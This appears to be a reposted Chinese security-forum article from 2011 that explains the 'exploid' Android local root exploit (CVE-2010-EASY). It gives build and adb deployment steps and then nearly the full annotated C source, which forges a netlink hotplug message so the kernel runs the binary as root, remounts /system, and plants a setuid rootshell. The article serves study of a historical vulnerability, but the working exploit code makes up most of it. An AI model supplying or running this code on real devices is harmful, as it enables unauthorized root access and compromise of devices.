@@ -1,0 +1,191 @@
+
+# Android root 源代码剖析--基于 CVE-2010-EASY
+
+> 原文：[`www.pediy.com/kssd/pediy12/139708.html`](https://www.pediy.com/kssd/pediy12/139708.html)
+
+标题: 【原创】Android root 源代码剖析--基于 CVE - 2010 - EASY  
+作者: androidhacker  
+时间: 2011-08-01 22:52  
+链接:http://bbs.pediy.com/showthread.php?p=997214#post997214  
+
+转载请注明出处:http://hi.baidu.com/androidhacker/blog/item/58581da8e3080391471064f1.html
+
+linux 系统由 `udev` 提供系统设备的管理，比如提供热拔插 `usb` 设备等等。而 Android 把 `udev` 的工作移交给 `init` 进程。而 linux 中版本号小于 `1.4.1` 的 `udev` 不会检查是由内核还是用户发送热拔插信息。因此用户可以发送恶意的信息让内核加载定义的恶意程序从而取得 `root` 权限。该代码如下。
+
+在代码内部进行了注释，并且程序执行的顺序用(1)序号标明了。
+
+通过在 `http://www.codesourcery.com/sgpp/lite/arm/portal/release1803` 下载编译工具
+
+通过 `arm-none-eabi-gcc exploid.c -static -o exploid` 编译
+
+`adb push exploid /data/local/tmp` 目录中执行即可 root
+
+提权之后 `rootshell` 是一个权限为 `04711` 的属于 `root` 的可执行程序，普通用户也可以运行该程序，由于 `S` 位置位，当普通用户执行该程序时有效用户 ID 为 `root`，从而可以运行 `root` 用户才能执行的程序和操作，从而提权成功。
+
+## 代码
+
+```
+ 
+int main(int argc, char **argv, char **env)
+{
+  ......
+        //(1)初始化要发送的数据，通过 NET_LINK 机制（参见 man 手册，可以与内核实现近似于套接字的通信方式）发送
+        struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
+        int sock;
+        char *basedir = NULL;
+ 
+
+
+        /* I hope there is no LD_ bug in androids rtld :) */
+        //(11)root 后执行 rootshell 则执行该步，直接创建一个有 root 权限的 shell
+        if (geteuid() == 0 && getuid() != 0)
+                rootshell(env);
+
+    //(2)获取程序的路径，为/data/local/tmp/exploid
+        if (readlink("/proc/self/exe", path, sizeof(path)) < 0)
+                die("[-] readlink");
+
+        if (geteuid() == 0) {
+        //(9)有内核加载热拔插固件时再次执行该应用，此时有效 id 为为 0，有 root 权限
+                clear_hotplug();
+                /* remount /system rw */
+
+                //(10)拷贝自己到/system/bin/目录下成为 rootshell，并改变 sh 的文件属性
+                remount_system("/system");
+                if (copy(path, "/system/bin/rootshell") != 0)
+                        chmod("/system/bin/sh", 04755);
+                else
+                        chmod("/system/bin/rootshell", 04711);
+                for (;;)
+                        sleep(3);
+        }
+
+        printf("[*] Android local root exploid (C) The Android Exploid Crew\n");
+    //(3)改变工作目录，没有 root 权限，只可以在少数目录执行
+        basedir = "/sqlite_stmt_journals";
+        if (chdir(basedir) < 0) {
+                basedir = "/data/local/tmp";
+                if (chdir(basedir) < 0)
+                        basedir = strdup(getcwd(buf, sizeof(buf)));
+        }
+
+        memset(&snl, 0, sizeof(snl));
+        snl.nl_pid = 1;
+        snl.nl_family = AF_NETLINK;
+         
+    //(4)构建一个 NETLINK 的套接字
+        if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
+                die("[-] socket");
+
+    //(5)创建要热拔插的文件，其中 hotplug 文件中存储的为/data/local/tmp/exploid
+        close(creat("loading", 0666));
+        if ((ofd = creat("hotplug", 0644)) < 0)
+                die("[-] creat");
+        if (write(ofd, path , strlen(path)) < 0)
+                die("[-] write");
+        close(ofd);
+         
+        //(6)建立一个 data 文件，为指向系统的 hotplug 的符号链接
+        symlink("/proc/sys/kernel/hotplug", "data");
+         
+        //(7)构建发送给内核的信息，内容为进行热拔插，固件位置在/data/local/tmp/hotplug
+        snprintf(buf, sizeof(buf), "ACTION=add%cDEVPATH=/..%s%c"
+                  "SUBSYSTEM=firmware%c"
+                  "FIRMWARE=../../..%s/hotplug%c", 0, basedir, 0, 0, basedir, 0);
+         
+        //(8)发送该信息
+        if (sendmsg(sock, &msg, 0) < 0)
+                die("[-] sendmsg");
+        close(sock);
+      
+        sleep(3);
+        return 0;
+}
+
+void die(const char *msg)
+{
+        perror(msg);
+        exit(errno);
+}
+
+
+int copy(const char *from, const char *to)
+{
+        int fd1, fd2;
+        char buf[0x1000];
+        int r = 0;
+
+        if ((fd1 = open(from, O_RDONLY)) < 0)
+                return -1;
+        if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
+                close(fd1);
+                return -1;
+        }
+
+        for (;;) {
+                r = read(fd1, buf, sizeof(buf));
+                if (r <= 0)
+                        break;
+                if (write(fd2, buf, r) != r)
+                        break;
+        }
+
+        close(fd1);
+        close(fd2);
+        sync(); sync();
+        return r;
+}
+
+
+void clear_hotplug()
+{
+        int ofd = open("/proc/sys/kernel/hotplug", O_WRONLY|O_TRUNC);
+        write(ofd, "", 1);
+        close(ofd);
+}
+
+
+void rootshell(char **env)
+{
+        char *sh[] = {"/system/bin/sh", 0};
+
+        // AID_SHELL
+        if (getuid() != 2000)
+                die("[-] Permission denied.");
+
+        setuid(0); setgid(0);
+        execve(*sh, sh, env);
+        die("[-] execve");
+}
+
+
+int remount_system(const char *mntpoint)
+{
+        FILE *f = NULL;
+        int found = 0;
+        char buf[1024], *dev = NULL, *fstype = NULL;
+
+        if ((f = fopen("/proc/mounts", "r")) == NULL)
+                return -1;
+
+        memset(buf, 0, sizeof(buf));
+        for (;!feof(f);) {
+                if (fgets(buf, sizeof(buf), f) == NULL)
+                        break;
+                if (strstr(buf, mntpoint)) {
+                        found = 1;
+                        break;
+                }
+        }
+        fclose(f);
+        if (!found)
+                return -1;
+        if ((dev = strtok(buf, " \t")) == NULL)
+                return -1;
+        if (strtok(NULL, " \t") == NULL)
+                return -1;
+        if ((fstype = strtok(NULL, " \t")) == NULL)
+                return -1;
+        return mount(dev, mntpoint, fstype, MS_REMOUNT, 0);
+}
+```
